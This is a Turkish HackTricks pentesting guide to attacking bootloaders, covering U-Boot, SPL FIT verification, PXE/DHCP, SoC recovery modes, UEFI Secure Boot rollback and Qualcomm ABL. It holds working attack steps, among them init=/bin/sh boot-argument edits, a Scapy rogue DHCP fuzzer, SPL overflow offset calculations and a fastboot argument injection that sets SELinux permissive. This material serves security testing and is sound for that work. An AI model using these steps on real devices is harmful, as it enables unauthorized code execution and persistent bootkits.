# Bootloader Testi

{{#include ../../banners/hacktricks-training.md}}

U-Boot ve UEFI sınıfı yükleyiciler gibi bootloader'ları test etmek ve cihaz başlangıç yapılandırmalarını değiştirmek için aşağıdaki adımlar önerilir. Erken kod yürütme elde etmeye, imza/geri alma korumalarını değerlendirmeye ve kurtarma ya da ağdan önyükleme yollarını kötüye kullanmaya odaklanın.

İlgili: bl2_ext yamalama yoluyla MediaTek secure-boot bypass:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot için hızlı kazanımlar ve ortam değişkenlerinin kötüye kullanılması

1. Yorumlayıcı shell'ine erişin
   - Önyükleme sırasında, `bootcmd` yürütülmeden önce U-Boot istemine düşmek için bilinen bir durdurma tuşuna (genellikle herhangi bir tuş, 0, boşluk veya karta özgü bir "magic" tuş dizisi) basın.<sup>[[1]](#references)</sup>

2. Önyükleme durumunu ve değişkenleri inceleyin
   - Yararlı komutlar:
     - `printenv` (ortam değişkenlerini döker)
     - `bdinfo` (kart bilgileri, bellek adresleri)
     - `help bootm; help booti; help bootz` (desteklenen kernel önyükleme yöntemleri)
     - `help ext4load; help fatload; help tftpboot` (kullanılabilir yükleyiciler)

3. Root shell elde etmek için önyükleme argümanlarını değiştirin
   - Kernel'in normal init yerine shell'e düşmesi için `init=/bin/sh` ekleyin:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. TFTP sunucunuzdan Netboot edin
   - Ağı yapılandırın ve LAN'den bir kernel/fit image alın:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Değişiklikleri environment üzerinden kalıcı hale getirin
   - env depolaması yazma korumalı değilse kontrolü kalıcı hale getirebilirsiniz:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Fallback yollarını etkileyen `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` gibi değişkenleri kontrol edin. Yanlış yapılandırılmış değerler, shell’e tekrar tekrar erişim sağlayabilir.

6. Debug/güvenli olmayan özellikleri kontrol edin
   - Şunları arayın: `bootdelay` > 0, `autoboot` devre dışı, kısıtlanmamış `usb start; fatload usb 0:1 ...`, seri bağlantı üzerinden `loady`/`loads` kullanabilme, güvenilmeyen medyadan `env import` ve imza kontrolü olmadan yüklenen kernel/ramdisk’ler.

7. U-Boot image/doğrulama testi
   - Platform, FIT images ile secure/verified boot kullandığını iddia ediyorsa hem imzasız hem de üzerinde değişiklik yapılmış images’ı deneyin:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` veya eski `verify=n` davranışının bulunmaması, çoğu zaman rastgele payload'ların boot edilmesine olanak tanır.
   - Basit bir izin/verme sonucunda durmayın: Yakın tarihli FIT araştırmaları, verification path'in kendisinin de pre-auth saldırı yüzeyi olabileceğini gösterdi. Harici olarak depolanan FIT verilerini (`data-offset`, `data-position`, `data-size`), imzalı configuration seçimini, `loadables`'ı ve overlay / `extra-conf` işleme biçimini negatif test edin.
   - Eşleşen bir kaynak ağacınız varsa `test/vboot/vboot_test.sh`, gerçek donanıma dokunmadan önce U-Boot sandbox'ta FIT verification davranışını yeniden oluşturmanın hızlı bir yoludur.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` ve script bootflows
   - Modern U-Boot derlemelerinde `bootcmd` genellikle Standard Boot etrafında bir wrapper'dan ibarettir. Bu, görünür ortam zararsız görünse bile yazılabilir medyanın, PXE'nin veya SPI flash'ın gerçek güven sınırı hâline gelebileceği anlamına gelir.
   - `extlinux` bootmeth, `/` ve `/boot` altında `extlinux/extlinux.conf` dosyasını arar; script bootmeth önce `boot.scr.uimg`, ardından `boot.scr` dosyasını arar. Network boot sırasında script dosya adı `boot_script_dhcp` üzerinden gelebilir.
   - Yararlı triage komutları:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Test edilecek kötüye kullanım senaryoları: `boot_targets` içinde daha önce gelen saldırganın kontrolündeki USB/SD medyası, yazılabilir `/boot/extlinux/extlinux.conf`, `boot.scr` sağlayan sahte TFTP veya `script_offset_f` üzerinden SPI destekli script çalıştırma.
   - Platform FIT doğrulamasına dayanıyorsa yapılandırmaların yalnızca image başına değil, yapılandırma düzeyinde de imzalandığından emin olun; `required-mode=all`, gerekli anahtarlardan herhangi birini kabul etmekten daha güçlüdür.

### SPL harici FIT verilerini doğrulamadan önce kopyalıyor

SPL FIT yüklemesinde, yapılandırma imzasının sağlam olması harici payload metadata'sını güvenli kılmaz. U-Boot, `data-position`, `data-offset` ve `data-size` alanlarını imzalı yapılandırma özelliklerinin dışında tutar. Etkilenen `load_simple_fit()` yollarında SPL, kaynak offset'ini ve kopyalama uzunluğunu bu alanlardan belirler, ardından image hash'ini kontrol **etmeden önce** `info->read()` çağrısı yapar. Bu nedenle yazılabilir boot medyasındaki hazırlanmış bir FIT, imza sahteciliği yapmadan RAM'in üzerine yazabilir. İmzalı `load` özelliği normalde hedef adresi sabitler; bu yüzden önce boyutu aşan bir kopyanın bu adresten stack'e veya diğer kontrol verilerine ulaşıp ulaşamayacağını belirleyin.<sup>[[15]](#references)[[16]](#references)</sup>

Flash okuması varsaymak yerine kartın gerçek loader'ını ve bellek haritasını izleyin: gösterilen RAM loader'ı `spl_ram_load_read()` ve `memcpy()` işlevlerine ulaştı. Çağrı noktasında `fit_offset` değerini ve reader'ın eklediği FIT taban adresini, loader'ın blok uzunluğunu (`spl_get_bl_len(info)`), fork'a özgü hizalamayı, oluşan `read_offset` ve aktarım `size` değerlerini, hedef `src_ptr` değerini ve kaydedilmiş dönüş adresinin konumunu not edin. Bitişik bir eşlenmiş kaynak bölgesinin gereken kopyalama mesafesini kapsayıp kapsamadığını, hedefle çakışıp çakışmadığını ve kaynak konumundaki baytların saldırganın kontrolündeki FIT verilerine işaret eden bir pointer sağlayıp sağlayamayacağını kontrol edin. Tam bir pointer, loader'ın hizalama kısıtlarını karşılayamıyorsa genel [kısmi dönüş adresi üzerine yazma tekniği](../../binary-exploitation/stack-overflow/ret2win/) uygulanabilir.<sup>[[16]](#references)</sup>

Araştırmacıların 32-bit AST2600 test build'inde `src_ptr` değeri `0x80001000`, `memcpy` işlevinin kaydedilmiş dönüş adresi ise `0x902ffe24` idi. OpenBMC'nin stack yerleşimi ve hizalama yardımcıları eklenerek değiştirilmiş bir upstream build kullandılar: RAM reader `0x10000` FIT tabanı ekledi; bu yardımcılar da kaynak offset'ini `ARCH_DMA_MINALIGN` (64 bayt) sınırına aşağı yuvarladı. `0x902fffe4` adresindeki kullanışlı bir little-endian pointer ve bir bayt eksik biten kopya, bilinen sıfır yüksek baytı koruyarak kaydedilmiş dönüş adresinin yalnızca en düşük üç baytını değiştirdi. Upstream RAM loader ise bir baytlık blok uzunluğu kullanır; dolayısıyla bu 64 baytlık hizalama ve kısmi üzerine yazma yöntemi genel SPL gereksinimleri değildir. Her build için adresleri, loader blok uzunluğunu ve kopyalama kapsamını yeniden hesaplayın. Aşağıdaki özgün hesaplamada `fit_offset`, `load_simple_fit()` işlevine aktarılan argümanı değil, RAM reader'ın eklediği etkin FIT tabanını ifade eder.<sup>[[16]](#references)</sup>

```text
distance      = saved_return_slot - destination = 0x102fee24
data-position = pointer_slot - distance - fit_offset = 0x7fff11c0
data-size     = distance + 3 = 0x102fee27
```

Upstream düzeltme, `info->read()` çağrısından önce hem ham `data-size` değerini hem de **block-aligned** aktarım boyutunu sınırlar. Overlay yolu gerçek buffer kapasitesini iletirken diğer çağıranlar yalnızca gevşek bir üst sınır olan `CONFIG_SYS_BOOTM_LEN` değerini kullanır; bu değer, hedefte bu kadar boş bellek bulunduğunu kanıtlamaz. Bir vendor fork’u değerlendirirken bu kontrollerin mevcut olduğunu doğrulayın ve izin verilen kopyalama aralığını kartın gerçek SPL stack’i ve ayrılmış bölgeleriyle karşılaştırın.<sup>[[15]](#references)[[16]](#references)</sup>

## Network-boot yüzeyi (DHCP/PXE) ve rogue server’lar

9. PXE/DHCP parametrelerini fuzzing ile test etme
   - U-Boot’un eski BOOTP/DHCP işleme kodunda bellek güvenliği sorunları görüldü. Örneğin CVE‑2024‑42040, belleğin açığa çıkmasına yol açabilen; U-Boot belleğindeki baytları kablo üzerinden sızdırabilen, özel hazırlanmış DHCP yanıtlarını açıklıyor.<sup>[[4]](#references)</sup> DHCP/PXE kod yollarını aşırı uzun/sınır durumundaki değerlerle (option 67 bootfile-name, vendor options, file/servername alanları) test edin ve takılma/sızıntı olup olmadığını gözlemleyin.
   - Netboot sırasında boot parametrelerini zorlamak için minimal Scapy kodu:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Ayrıca, PXE filename alanlarının işletim sistemi tarafındaki provisioning script’lerine zincirlendiğinde sanitization uygulanmadan shell/loader logic’e aktarılıp aktarılmadığını doğrulayın.

10. Rogue DHCP server command injection testi
   - Bir rogue DHCP/PXE servisi kurun ve boot chain’in sonraki aşamalarında command interpreter’lara ulaşmak için filename veya options alanlarına karakter enjekte etmeyi deneyin. Metasploit’in DHCP auxiliary modülü, `dnsmasq` veya özel Scapy script’leri işinizi görür. Önce lab ağını izole ettiğinizden emin olun.

## Normal boot sürecini geçersiz kılan SoC ROM recovery modları

Birçok SoC, flash image’ları geçersiz olsa bile USB/UART üzerinden kod kabul eden bir BootROM "loader" moduna sahiptir. Secure-boot fuse’ları yakılmamışsa bu, chain’in çok erken bir aşamasında arbitrary code execution sağlayabilir.

- NXP i.MX (Serial Download Mode)
  - Araçlar: `uuu` (mfgtools3) veya `imx-usb-loader`.
  - Örnek: RAM’den özel bir U-Boot yükleyip çalıştırmak için `imx-usb-loader u-boot.imx`.
- Allwinner (FEL)
  - Araç: `sunxi-fel`.
  - Örnek: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` veya `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Araç: `rkdeveloptool`.
  - Örnek: Bir loader yükleyip özel bir U-Boot’u upload etmek için `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`.

Cihazın secure-boot eFuse/OTP değerlerinin yakılıp yakılmadığını değerlendirin. Yakılmamışlarsa BootROM download modları, ilk aşama payload’ınızı doğrudan SRAM/DRAM’den çalıştırarak çoğu zaman üst katmanlardaki doğrulamaları (U-Boot, kernel, rootfs) atlatır.

## UEFI/PC sınıfı bootloader’lar: hızlı kontroller

11. ESP tampering, rollback ve key-enrollment testi
   - EFI System Partition’ı (ESP) mount edin ve loader bileşenlerini kontrol edin: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo yolları.
   - Mümkünse işletim sisteminden Secure Boot durumunu ve key database’lerini dump edin:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Platform Setup Mode’daysa, kimlik doğrulaması olmadan anahtar kaydına izin veriyorsa veya test/varsayılan bir Platform Key (PKfail sınıfı) ile geliyorsa, yerel bir admin ya da fiziksel erişimi olan saldırgan kendi KEK/db anahtarlarını kaydedip Secure Boot “etkin” görünürken keyfi EFI binary’lerini başlatabilir.<sup>[[3]](#references)</sup>
   - Secure Boot iptal listeleri (dbx) güncel değilse, sürümü düşürülmüş veya bilinen güvenlik açıklarına sahip imzalı boot bileşenleriyle başlatmayı deneyin. Platform eski shim’lere/bootmanager’lara hâlâ güveniyorsa, kalıcılık elde etmek için genellikle ESP’den kendi kernel’inizi veya `grub.cfg` dosyanızı yükleyebilirsiniz.
   - Windows’ta, `Microsoft Windows Production PCA 2011` imzalayıcısı firmware `dbx` içinde bulunmadığında yamalı sistemler bile güvenlik açığı bulunan imzalı boot manager’ları kabul edebilir; bu durum BlackX’te gözlemlenmiştir.<sup>[[13]](#references)[[14]](#references)</sup> Baton Drop tarzı bir bypass, saldırganın MOK kaydetmesini sağlayabilir; ardından meşru bir shim, sonraki başlatmalarda bu anahtarla imzalanmış bir EFI payload’ını yükleyebilir.<sup>[[12]](#references)[[13]](#references)</sup> Eski Windows imzalayıcısını daha sonra iptal etmek, kaydedilmiş MOK’u kaldırmaz; dolayısıyla shim’e dayalı bu yöntem, shim güvenilir kaldığı sürece kalıcı olabilir.<sup>[[12]](#references)</sup>
   - Yetkili bir UEFI makinede bu rollback yolunu test etmeden önce yalnızca Windows güncelleme geçmişini değil, **etkin firmware iptal durumunu** kontrol edin.<sup>[[13]](#references)[[14]](#references)</sup> Microsoft, `dbx` içindeki 2011 imzalayıcısını kontrol etmek için bu salt okunur, yükseltilmiş PowerShell komutunu sunar:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` yalnızca bir ipucudur: kurtarılabilir bir laboratuvar ortamında imzalı belirli boot bileşenini ve diğer iptal durumlarını doğrulayın.<sup>[[12]](#references)[[14]](#references)</sup> Bekleyen bir registry güncellemesi veya süresi dolmuş bir imzalama sertifikası, tamamlanmış bir `dbx` iptaliyle eşdeğer değildir.<sup>[[13]](#references)[[14]](#references)</sup>

12. Eski shim / SBAT / dbx iptal testi
   - Eski Microsoft imzalı shim'ler ve vendor fork'ları, iptaller güncel değilse hâlâ BYOVD tarzı bir bootkit yolu olarak kullanılabilir. İzole bir laboratuvar ortamında, ESP'ye geçmişte güvenlik açığı bulunan bir shim yerleştirin ve kendi `grubx64.efi` dosyanızı veya kernel'inizi chainload etmeyi deneyin.<sup>[[11]](#references)</sup>
   - Hızlı ön değerlendirme:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Shim revocation listesinde olmasına rağmen çalışıyorsa, firmware/OS eski `dbx` güncellemelerine sahiptir veya upstream SBAT korumalarını hiç devralmamış fork edilmiş bir loader'a güveniyordur.

13. Boot logo ayrıştırma hataları (LogoFAIL sınıfı)
   - Birkaç OEM/IBV firmware’i, boot logolarını işleyen DXE’deki görüntü ayrıştırma hatalarına karşı savunmasızdı. Saldırgan ESP’ye üreticiye özgü bir yol altında (ör. `\EFI\<vendor>\logo\*.bmp`) hazırlanmış bir görüntü yerleştirip cihazı yeniden başlatabiliyorsa, Secure Boot etkin olsa bile erken boot sırasında kod yürütme mümkün olabilir. Platformun kullanıcı tarafından sağlanan logoları kabul edip etmediğini ve bu yollara OS’den yazılıp yazılamadığını test edin.<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) güven boşlukları

Qualcomm'un ABL'sini kullanarak **Generic Bootloader Library (GBL)** yükleyen Android 16 cihazlarında, ABL'nin `efisp` bölümünden yüklediği UEFI uygulamasının **kimliğini doğrulayıp doğrulamadığını** kontrol edin. ABL yalnızca bir UEFI uygulamasının **varlığını** kontrol ediyor ve imzaları doğrulamıyorsa, `efisp`'e yazma olanağı boot sırasında **işletim sistemi öncesinde imzasız kod yürütmeye** olanak verir.<sup>[[6]](#references)[[7]](#references)</sup>

Uygulanabilir kontroller ve kötüye kullanım yolları:

- **efisp yazma olanağı**: `efisp` içine özel bir UEFI uygulaması yazmanın bir yoluna ihtiyacınız vardır (root/ayrıcalıklı servis, OEM uygulama hatası, recovery/fastboot yolu). Bu olmadan GBL yükleme açığına doğrudan erişilemez.<sup>[[6]](#references)</sup>
- **fastboot OEM argüman enjeksiyonu** (ABL hatası): Bazı derlemeler `fastboot oem set-gpu-preemption` komutunda ek token’ları kabul edip kernel cmdline'a ekler. Bu, korumalı bölümlere yazmayı mümkün kılan permissive SELinux'u zorla etkinleştirmek için kullanılabilir:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Cihaz patch uygulanmışsa komut ek argümanları reddetmelidir.<sup>[[5]](#references)[[6]](#references)</sup>
- **Kalıcı flag'ler üzerinden bootloader kilidini açma**: Boot aşamasındaki bir payload, OEM sunucusu/onay kontrollerini aşarak `fastboot oem unlock` komutunu taklit etmek için kalıcı kilit açma flag'lerini (ör. `is_unlocked=1`, `is_unlocked_critical=1`) değiştirebilir. Bu, sonraki yeniden başlatmadan sonra kalıcı bir durum değişikliğine yol açar.<sup>[[6]](#references)</sup>

Savunma/triage notları:

- ABL'nin `efisp` içindeki GBL/UEFI payload üzerinde imza doğrulaması yapıp yapmadığını kontrol edin. Yapmıyorsa `efisp`'i yüksek riskli bir kalıcılık yüzeyi olarak değerlendirin.
- ABL fastboot OEM işleyicilerinin **argüman sayılarını doğrulamak** ve ek token'ları reddetmek üzere patch'lenip patch'lenmediğini takip edin.<sup>[[8]](#references)[[9]](#references)</sup>

## Donanım konusunda dikkat

Erken boot sırasında SPI/NAND flash ile etkileşimde bulunurken dikkatli olun (ör. okumaları atlatmak için pinleri toprağa bağlamak) ve daima flash veri sayfasına başvurun. Zamanlaması yanlış kısa devreler cihaza veya programlayıcıya zarar verebilir.

## Notlar ve ek ipuçları

- Ortam blob'larını RAM ile depolama arasında taşımak için `env export -t ${loadaddr}` ve `env import -t ${loadaddr}` komutlarını deneyin; bazı platformlarda çıkarılabilir medyadan kimlik doğrulaması olmadan env içe aktarılabilir.
- `extlinux.conf` üzerinden boot eden Linux tabanlı sistemlerde kalıcılık için, imza kontrolleri uygulanmıyorsa boot bölümündeki `APPEND` satırını değiştirmek (`init=/bin/sh` veya `rd.break` eklemek) genellikle yeterlidir.
- Hedef dual-slot / A/B güncellemeleri kullanıyorsa, bootloader dışındaki updater'a özgü güven boşluklarını gözden kaçırmamak için [firmware analysis overview](README.md) içindeki anti-rollback ve slot-desync tekniklerini inceleyin.
- Userland `fw_printenv/fw_setenv` sağlıyorsa, `/etc/fw_env.config` dosyasının gerçek env depolama alanıyla eşleştiğini doğrulayın. Hatalı yapılandırılmış offset'ler yanlış MTD bölgesini okumanıza/yazmanıza neden olur.

## References

- [1] [Firmware Güvenliği Test Metodolojisi](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [LogoFAIL'i keşfetmek: Sistem boot ederken görüntü ayrıştırmanın tehlikeleri](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Güvenilmeyen Platform Anahtarları, UEFI Ekosisteminde Secure Boot'u Zayıflatıyor](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 ayrıntıları](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Önceden engellendi: İki temizlenmemiş string ile Xiaomi kilidini açma](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit'i saldırganların bootloader kilitlerini açmasına olanak tanıyor](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) mimarisi](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Güvenilmeyen girdinin kernel cmdline'a aktarımını düzeltme](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: set-hw-fence-value komutu için kontrol ekleme](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Boot edilemez: U-Boot'un FIT imza doğrulamasını bozma](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Güvenlik Açığı Notu VU#616257 - Microsoft imzalı UEFI shim bootloader'ları Secure Boot atlatmasına karşı savunmasız](https://kb.cert.org/vuls/id/616257)
- [12] [BlackLotus UEFI bootkit'i: Efsane doğrulandı](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: BlackLotus benzeri bir UEFI bootkit'i](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Secure Boot değişiklikleri için Windows Boot Manager iptallerini yönetme](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
- [15] [U-Boot yaması: Harici veriyi okumadan önce boyutunu sınırlandırma](https://github.com/u-boot/u-boot/commit/8f71d7170f5c3abadee45683e35ae6d925b6d417)
- [16] [Gizli FIT avantajları: U-Boot SPL'de imza doğrulamasını atlatma](https://www.binarly.io/blog/signature-verification-bypass-in-u-boot-spl)
{{#include ../../banners/hacktricks-training.md}}
